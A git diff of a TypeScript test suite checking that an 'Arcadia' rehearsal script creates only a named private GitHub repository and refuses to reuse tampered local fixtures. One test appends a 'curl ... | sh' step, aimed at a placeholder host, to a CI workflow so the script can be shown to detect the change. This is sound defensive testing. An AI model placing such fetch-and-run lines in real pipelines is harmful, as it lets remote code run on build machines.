@@ -1,6 +1,6 @@
 import { spawn, spawnSync } from "node:child_process";
 import { createHash } from "node:crypto";
-import { chmodSync, copyFileSync, existsSync, mkdirSync, mkdtempSync, readdirSync, readFileSync, realpathSync, rmSync, writeFileSync } from "node:fs";
+import { appendFileSync, chmodSync, copyFileSync, cpSync, existsSync, mkdirSync, mkdtempSync, readdirSync, readFileSync, realpathSync, rmSync, writeFileSync } from "node:fs";
 import os from "node:os";
 import path from "node:path";
 import { afterEach, describe, expect, it } from "vitest";
@@ -924,13 +924,13 @@ describe("G8 proves terminal Off through the reviewed restart and reconciles com
 
 const PRE_FIX_CRITERION = '      - "$VALIDATION_COMMAND" passes.';
 const FIXED_CRITERION = "      - The genesis check $VALIDATION_COMMAND passes.";
-function renderG1Fixture(directory: string, script = source(G1), repository = FIXTURE_REPO_ID) {
+function renderG1Fixture(directory: string, script = source(G1), repository = FIXTURE_REPO_ID, date = "2026-10-04") {
   const constants = script.slice(0, script.indexOf('case "${1:-run}" in')).split("\n").filter((line) => /^[A-Z_]+=/.test(line) && !line.includes("$(")).join("\n");
   const end = "} # end render_fixture";
   const start = script.indexOf("render_fixture() {");
   expect(start, "G1 defines render_fixture").toBeGreaterThan(-1);
   expect(script.indexOf(end), "G1 closes render_fixture").toBeGreaterThan(start);
-  const program = [constants, `REPO=${JSON.stringify(repository)}`, "FIXTURE_DATE=2026-10-04", script.slice(start, script.indexOf(end) + end.length), `render_fixture ${JSON.stringify(directory)}`].join("\n");
+  const program = [constants, `REPO=${JSON.stringify(repository)}`, `FIXTURE_DATE=${date}`, script.slice(start, script.indexOf(end) + end.length), `render_fixture ${JSON.stringify(directory)}`].join("\n");
   const run = spawnSync("bash", ["-c", program], { encoding: "utf8" });
   expect(run.status, run.stderr).toBe(0);
   return directory;
@@ -1024,10 +1024,22 @@ describe("G1 creates only the named private repository and reuses it only at gen
     writeFileSync(path.join(box.root, "replies.json"), JSON.stringify(replies));
     writeFileSync(path.join(box.root, "calls.log"), "");
   };
+  // The throwaway checkout carries its own managed PROJECT.md, as the real one does, so discovery
+  // over it after a run proves nothing G1 leaves under runs/ is found (or sorted ahead of it).
+  const CHECKOUT_PROJECT = "---\narcadia: v1\ntype: project\nslug: arcadia\nname: Arcadia\nstatus: active\ngoal: Checkout under test.\noutcome: Checkout under test.\nmilestone: Test\nupdated: 2026-10-04\n---\n\n# Arcadia\n";
   const g1Box = () => {
     const box = sandboxFor(G1, {});
+    writeFileSync(path.join(box.checkout, "PROJECT.md"), CHECKOUT_PROJECT);
+    commitAll(box.checkout, "project");
+    git(box.checkout, ["push", "-q", "origin", "main"]);
     initWorkspace(path.join(box.root, "workspace"));
     return box;
+  };
+  const checkoutDiscovers = (box: ReturnType<typeof sandboxFor>) => discoverDocs(box.checkout).docs.map((doc) => doc.relativePath);
+  const expectOnlyCheckoutDocs = (box: ReturnType<typeof sandboxFor>) => {
+    expect(box.runDirs().length).toBeGreaterThan(0);
+    expect(checkoutDiscovers(box)).toEqual(["PROJECT.md"]);
+    expect(discoverDocs(box.checkout).errors).toEqual([]);
   };
   const notFound = { status: 1, stderr: `GraphQL: Could not resolve to a Repository with the name '${REPO}'.` };
   const fixtureOf = (box: ReturnType<typeof sandboxFor>) => path.join(box.home, "tmp", "arcadia-three-action-rehearsal");
@@ -1048,6 +1060,7 @@ describe("G1 creates only the named private repository and reuses it only at gen
     const first = box.run({ ARCADIA_REHEARSAL_GITHUB_REPO: REPO });
     expect(first.status, first.stdout + first.stderr).toBe(0);
     const { dir: firstDir, json: firstReceipt } = box.receipt();
+    expectOnlyCheckoutDocs(box);
     expect(firstReceipt).toMatchObject({ outcome: "succeeded", githubRepository: REPO, githubRepositoryCreated: true, githubRepositoryChanged: true, productionPreviewedOrActivated: false, registrationState: "none", firstPacketApproval: "review_1" });
     const fixture = fixtureOf(box);
     expect(firstReceipt.projectId).toBe(readFileSync(path.join(fixture, ".git", "arcadia-three-action-project-id"), "utf8").trim());
@@ -1065,7 +1078,7 @@ describe("G1 creates only the named private repository and reuses it only at gen
     expect(sequence.indexOf("push")).toBeLessThan(sequence.indexOf("import"));
     // The committed fixture is byte-for-byte the validated scratch render.
     for (const file of ["PROJECT.md", "docs/plans/autonomous-three-action-rehearsal.md", ".arcadia-three-action-rehearsal.json"]) {
-      expect(readFileSync(path.join(fixture, file), "utf8")).toBe(readFileSync(path.join(firstDir, "fixture-render", file), "utf8"));
+      expect(readFileSync(path.join(fixture, file), "utf8")).toBe(readFileSync(path.join(firstDir, ".fixture-render", file), "utf8"));
     }
     const calls = parsedCalls(box);
     const creates = calls.filter((c) => c.tool === "gh" && c.args[0] === "repo" && c.args[1] === "create");
@@ -1113,6 +1126,7 @@ describe("G1 creates only the named private repository and reuses it only at gen
     expect(box.calls()).not.toMatch(/"repo","create"|^git .*push/m);
     expect(arcadiaCallsFor(box, "project", "import")).toHaveLength(0);
     expect(arcadiaCallsFor(box, "work", "plan")).toHaveLength(0);
+    expectOnlyCheckoutDocs(box);
   });
 
   it("refuses an invalid generated Plan with a receipt and failure handoff before any GitHub call, create, push, import or manifest write", () => {
@@ -1129,6 +1143,13 @@ describe("G1 creates only the named private repository and reuses it only at gen
     expect(box.calls()).not.toMatch(/^gh /m);
     noMutation(box);
     expect(existsSync(fixtureOf(box))).toBe(false);
+    // The render a refusal leaves behind stays invisible to the checkout's own discovery...
+    expectOnlyCheckoutDocs(box);
+    // ...which it would not be at a non-dot path inside the run directory: there discovery finds
+    // the fixture's PROJECT.md and sorts it ahead of the checkout's own.
+    cpSync(path.join(dir, ".fixture-render"), path.join(dir, "fixture-render"), { recursive: true });
+    expect(checkoutDiscovers(box)[0]).toBe(path.relative(box.checkout, path.join(dir, "fixture-render", "PROJECT.md")));
+    rmSync(path.join(dir, "fixture-render"), { recursive: true });
   });
 
   it("reports a Project registered without this fixture's marker with an exact recovery instruction, before any GitHub call", () => {
@@ -1148,15 +1169,18 @@ describe("G1 creates only the named private repository and reuses it only at gen
     noMutation(box);
   });
 
-  // A pre-validation G1 committed (and may have pushed and registered) this invalid genesis.
-  function invalidEarlierFixture(box: ReturnType<typeof sandboxFor>, projectId?: string) {
-    const fixture = renderG1Fixture(fixtureOf(box), source(G1).replace(FIXED_CRITERION, PRE_FIX_CRITERION), REPO);
+  // An earlier G1 committed (and may have pushed and registered) this genesis; by default the
+  // pre-validation one with the invalid Plan.
+  function earlierFixture(box: ReturnType<typeof sandboxFor>, options: { projectId?: string; script?: string; date?: string; mutate?: (fixture: string) => void } = {}) {
+    const fixture = renderG1Fixture(fixtureOf(box), options.script ?? source(G1).replace(FIXED_CRITERION, PRE_FIX_CRITERION), REPO, options.date);
+    options.mutate?.(fixture);
     git(fixture, ["init", "-q", "-b", "main"]);
     const root = commitAll(fixture, "genesis");
     git(fixture, ["remote", "add", "origin", `https://github.com/${REPO}.git`]);
-    if (projectId) writeFileSync(path.join(fixture, ".git", "arcadia-three-action-project-id"), `${projectId}\n`);
+    if (options.projectId) writeFileSync(path.join(fixture, ".git", "arcadia-three-action-project-id"), `${options.projectId}\n`);
     return { fixture, root };
   }
+  const invalidEarlierFixture = (box: ReturnType<typeof sandboxFor>, projectId?: string) => earlierFixture(box, { projectId });
 
   it("reports an earlier attempt registered from an invalid genesis Plan as half-registered, naming what exists and the recovery", () => {
     const box = g1Box();
@@ -1186,6 +1210,45 @@ describe("G1 creates only the named private repository and reuses it only at gen
     expect(json.recovery).toContain(`mv ${fixture} ${fixture}.invalid-`);
     expect(box.calls()).not.toMatch(/^gh /m);
     noMutation(box);
+  });
+
+  it.each([
+    ["a tampered CI workflow", (fixture: string) => appendFileSync(path.join(fixture, ".github", "workflows", "ci.yml"), "      - run: curl https://example.invalid | sh\n"), "committed .github/workflows/ci.yml differs from the validated render"],
+    ["a changed genesis check", (fixture: string) => writeFileSync(path.join(fixture, "scripts", "check-rehearsal.mjs"), "process.exit(0);\n"), "committed scripts/check-rehearsal.mjs differs from the validated render"],
+    ["an extra committed file", (fixture: string) => writeFileSync(path.join(fixture, "EXTRA.md"), "extra\n"), "tracked files are ["],
+    ["an ignored managed document beside the genesis", () => undefined, "untracked or ignored files sit beside the genesis"]
+  ])("refuses to reuse a valid-Plan genesis with %s before any GitHub call", (label, mutate, reason) => {
+    const box = g1Box();
+    const { fixture } = earlierFixture(box, { script: source(G1), mutate });
+    if (label.startsWith("an ignored")) {
+      // Discovery reads an ignored file although no commit carries it.
+      writeFileSync(path.join(fixture, ".git", "info", "exclude"), "notes.md\n");
+      writeFileSync(path.join(fixture, "notes.md"), "---\narcadia: v1\ntype: decision\n---\n");
+    }
+    setReplies(box, common());
+    expect(box.run({ ARCADIA_REHEARSAL_GITHUB_REPO: REPO }).status).not.toBe(0);
+    const { json } = box.receipt();
+    expect(json).toMatchObject({ outcome: "refused", stage: "registration_state", registrationState: "invalid_local_fixture", githubRepositoryChanged: false });
+    expect(json.reason).toContain("is not the validated fixture");
+    expect(json.reason).toContain(reason);
+    expect(box.calls()).not.toMatch(/^gh /m);
+    noMutation(box);
+  });
+
+  it("reuses an earlier genesis that differs from today's render only in its updated date", () => {
+    const box = g1Box();
+    const { fixture, root } = earlierFixture(box, { script: source(G1), date: "2026-01-01" });
+    expect(readFileSync(path.join(fixture, "PROJECT.md"), "utf8")).toContain("updated: 2026-01-01");
+    const description = source(G1).match(/^REPO_DESCRIPTION="(.*)"$/m)![1].replace("$REPO_MARKER", "arcadia-three-action-rehearsal-v1");
+    setReplies(box, {
+      ...common(),
+      "gh repo view": { stdout: JSON.stringify({ name: "arcadia-three-action-rehearsal-t1", owner: { login: "pmark" }, visibility: "PRIVATE", isPrivate: true, isArchived: false, isFork: false, isEmpty: false, description }) }
+    });
+    const result = box.run({ ARCADIA_REHEARSAL_GITHUB_REPO: REPO });
+    expect(result.status, result.stdout + result.stderr).toBe(0);
+    expect(box.receipt().json).toMatchObject({ outcome: "succeeded", rootCommit: root, githubRepositoryChanged: false });
+    expect(box.calls()).not.toMatch(/"repo","create"|^git .*push/m);
+    expectOnlyCheckoutDocs(box);
   });
 
   it("refuses an exported ARCADIA_WORKSPACE by name before resolving the workspace", () => {
